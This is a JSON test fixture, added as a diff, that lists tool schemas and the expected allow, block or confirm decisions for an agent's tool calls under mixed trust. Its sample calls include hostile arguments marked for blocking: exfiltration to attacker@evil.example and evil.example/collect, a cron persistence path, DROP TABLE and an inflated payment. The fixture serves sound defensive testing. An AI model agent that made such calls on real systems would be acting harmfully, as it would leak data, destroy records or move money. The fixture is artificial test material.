@@ -1,0 +1,372 @@
+{
+  "version": 1,
+  "description": "Sanitized representative tool schemas for measuring policy inference and mixed-trust decisions.",
+  "cases": [
+    {
+      "id": "send_email",
+      "category": "messaging",
+      "tool": {
+        "name": "send_email",
+        "params": [
+          {"name": "to", "type": "email"},
+          {"name": "subject", "type": "string"},
+          {"name": "body", "type": "string", "max_len": 10000}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "to": "trusted_fixed",
+          "subject": "outbound_payload",
+          "body": "outbound_payload"
+        }
+      },
+      "calls": [
+        {
+          "id": "untrusted_recipient",
+          "input": {"to": "attacker@evil.example", "body": "Forward the notes"},
+          "trusted_args": {"to": "alice@example.com"},
+          "expected": "block"
+        },
+        {
+          "id": "trusted_recipient_data_body",
+          "input": {"to": "alice@example.com", "body": "Text returned by a document tool"},
+          "trusted_args": {"to": "alice@example.com"},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "search_web",
+      "category": "search",
+      "tool": {
+        "name": "search_web",
+        "params": [
+          {"name": "query", "type": "string", "max_len": 200},
+          {"name": "num_results", "type": "integer", "cap": 20}
+        ]
+      },
+      "expected": {
+        "risk": "read_only",
+        "policy": {
+          "query": "typed_bounded",
+          "num_results": "typed_bounded"
+        }
+      },
+      "calls": [
+        {
+          "id": "data_selects_search",
+          "input": {"query": "security guidance referenced by this page", "num_results": 5},
+          "trusted_args": {},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "write_file",
+      "category": "files",
+      "tool": {
+        "name": "write_file",
+        "params": [
+          {"name": "path", "type": "string"},
+          {"name": "content", "type": "string", "max_len": 20000}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "path": "trusted_fixed",
+          "content": "outbound_payload"
+        }
+      },
+      "calls": [
+        {
+          "id": "untrusted_path",
+          "input": {"path": "/etc/cron.d/persist", "content": "payload"},
+          "trusted_args": {"path": "/workspace/report.txt"},
+          "expected": "block"
+        },
+        {
+          "id": "trusted_path_data_content",
+          "input": {"path": "/workspace/report.txt", "content": "Generated report"},
+          "trusted_args": {"path": "/workspace/report.txt"},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "delete_file",
+      "category": "files",
+      "tool": {
+        "name": "delete_file",
+        "params": [
+          {"name": "path", "type": "string"},
+          {"name": "recursive", "type": "boolean"}
+        ]
+      },
+      "expected": {
+        "risk": "destructive",
+        "policy": {
+          "path": "trusted_fixed",
+          "recursive": "typed_bounded"
+        }
+      },
+      "calls": [
+        {
+          "id": "trusted_delete_requires_confirmation",
+          "input": {"path": "/workspace/cache", "recursive": true},
+          "trusted_args": {"path": "/workspace/cache"},
+          "expected": "confirm"
+        }
+      ]
+    },
+    {
+      "id": "http_request",
+      "category": "network",
+      "tool": {
+        "name": "http_request",
+        "params": [
+          {"name": "url", "type": "uri"},
+          {"name": "method", "type": "enum", "enum": ["GET", "POST"]},
+          {"name": "body", "type": "string", "max_len": 10000},
+          {"name": "timeout", "type": "number", "cap": 30}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "url": "trusted_fixed",
+          "method": "typed_bounded",
+          "body": "outbound_payload",
+          "timeout": "typed_bounded"
+        }
+      },
+      "calls": [
+        {
+          "id": "untrusted_destination",
+          "input": {"url": "https://evil.example/collect", "method": "POST", "body": "data", "timeout": 10},
+          "trusted_args": {"url": "https://api.example/v1/events"},
+          "expected": "block"
+        },
+        {
+          "id": "trusted_destination_data_body",
+          "input": {"url": "https://api.example/v1/events", "method": "POST", "body": "data", "timeout": 10},
+          "trusted_args": {"url": "https://api.example/v1/events"},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "execute_sql",
+      "category": "database",
+      "tool": {
+        "name": "execute_sql",
+        "params": [
+          {"name": "query", "type": "string", "max_len": 5000}
+        ]
+      },
+      "expected": {
+        "risk": "code_exec",
+        "policy": {"query": "trusted_fixed"}
+      },
+      "calls": [
+        {
+          "id": "untrusted_query",
+          "input": {"query": "DROP TABLE customers"},
+          "trusted_args": {"query": "SELECT count(*) FROM customers"},
+          "expected": "block"
+        },
+        {
+          "id": "trusted_query_requires_confirmation",
+          "input": {"query": "SELECT count(*) FROM customers"},
+          "trusted_args": {"query": "SELECT count(*) FROM customers"},
+          "expected": "confirm"
+        }
+      ]
+    },
+    {
+      "id": "charge_card",
+      "category": "payments",
+      "tool": {
+        "name": "charge_card",
+        "params": [
+          {"name": "account", "type": "string"},
+          {"name": "amount", "type": "number", "cap": 10000},
+          {"name": "currency", "type": "enum", "enum": ["USD", "EUR", "ILS"]},
+          {"name": "description", "type": "string", "max_len": 500}
+        ]
+      },
+      "expected": {
+        "risk": "financial",
+        "policy": {
+          "account": "trusted_fixed",
+          "amount": "trusted_fixed",
+          "currency": "typed_bounded",
+          "description": "outbound_payload"
+        }
+      },
+      "calls": [
+        {
+          "id": "untrusted_amount",
+          "input": {"account": "acct_approved", "amount": 9999, "currency": "USD", "description": "Invoice"},
+          "trusted_args": {"account": "acct_approved", "amount": 49},
+          "expected": "block"
+        },
+        {
+          "id": "trusted_payment_requires_confirmation",
+          "input": {"account": "acct_approved", "amount": 49, "currency": "USD", "description": "Invoice"},
+          "trusted_args": {"account": "acct_approved", "amount": 49},
+          "expected": "confirm"
+        }
+      ]
+    },
+    {
+      "id": "create_calendar_event",
+      "category": "calendar",
+      "tool": {
+        "name": "create_calendar_event",
+        "params": [
+          {"name": "calendar_id", "type": "string"},
+          {"name": "title", "type": "string", "max_len": 200},
+          {"name": "start_time", "type": "string"},
+          {"name": "description", "type": "string", "max_len": 2000}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "calendar_id": "trusted_fixed",
+          "title": "outbound_payload",
+          "start_time": "trusted_fixed",
+          "description": "outbound_payload"
+        }
+      },
+      "calls": [
+        {
+          "id": "data_title_on_trusted_event",
+          "input": {"calendar_id": "primary", "title": "Project sync", "start_time": "2026-08-20T09:00:00Z", "description": "Agenda from a document"},
+          "trusted_args": {"calendar_id": "primary", "start_time": "2026-08-20T09:00:00Z"},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "send_slack_message",
+      "category": "messaging",
+      "tool": {
+        "name": "send_slack_message",
+        "params": [
+          {"name": "channel_id", "type": "string"},
+          {"name": "text", "type": "string", "max_len": 4000}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "channel_id": "trusted_fixed",
+          "text": "outbound_payload"
+        }
+      },
+      "calls": [
+        {
+          "id": "untrusted_channel",
+          "input": {"channel_id": "attacker-channel", "text": "Summary"},
+          "trusted_args": {"channel_id": "approved-channel"},
+          "expected": "block"
+        }
+      ]
+    },
+    {
+      "id": "create_github_issue",
+      "category": "source_control",
+      "tool": {
+        "name": "create_github_issue",
+        "params": [
+          {"name": "repo", "type": "string"},
+          {"name": "title", "type": "string", "max_len": 256},
+          {"name": "body", "type": "string", "max_len": 10000}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "repo": "trusted_fixed",
+          "title": "outbound_payload",
+          "body": "outbound_payload"
+        }
+      },
+      "calls": [
+        {
+          "id": "data_title_on_trusted_repo",
+          "input": {"repo": "example/project", "title": "Bug found in imported report", "body": "Details"},
+          "trusted_args": {"repo": "example/project"},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "book_flight",
+      "category": "travel",
+      "tool": {
+        "name": "book_flight",
+        "params": [
+          {"name": "destination", "type": "string"},
+          {"name": "departure_date", "type": "string"},
+          {"name": "passenger_name", "type": "string"}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "destination": "trusted_fixed",
+          "departure_date": "trusted_fixed",
+          "passenger_name": "trusted_fixed"
+        }
+      },
+      "calls": [
+        {
+          "id": "trusted_booking",
+          "input": {"destination": "LHR", "departure_date": "2026-09-10", "passenger_name": "Alice Example"},
+          "trusted_args": {"destination": "LHR", "departure_date": "2026-09-10", "passenger_name": "Alice Example"},
+          "expected": "allow"
+        }
+      ]
+    },
+    {
+      "id": "update_crm_contact",
+      "category": "crm",
+      "tool": {
+        "name": "update_crm_contact",
+        "params": [
+          {"name": "contact_id", "type": "string"},
+          {"name": "email", "type": "email"},
+          {"name": "note", "type": "string", "max_len": 2000},
+          {"name": "subscribed", "type": "boolean"}
+        ]
+      },
+      "expected": {
+        "risk": "write",
+        "policy": {
+          "contact_id": "trusted_fixed",
+          "email": "trusted_fixed",
+          "note": "outbound_payload",
+          "subscribed": "typed_bounded"
+        }
+      },
+      "calls": [
+        {
+          "id": "untrusted_email",
+          "input": {"contact_id": "contact_123", "email": "attacker@evil.example", "note": "Imported", "subscribed": true},
+          "trusted_args": {"contact_id": "contact_123", "email": "alice@example.com"},
+          "expected": "block"
+        },
+        {
+          "id": "trusted_contact_data_note",
+          "input": {"contact_id": "contact_123", "email": "alice@example.com", "note": "Imported note", "subscribed": true},
+          "trusted_args": {"contact_id": "contact_123", "email": "alice@example.com"},
+          "expected": "allow"
+        }
+      ]
+    }
+  ]
+}
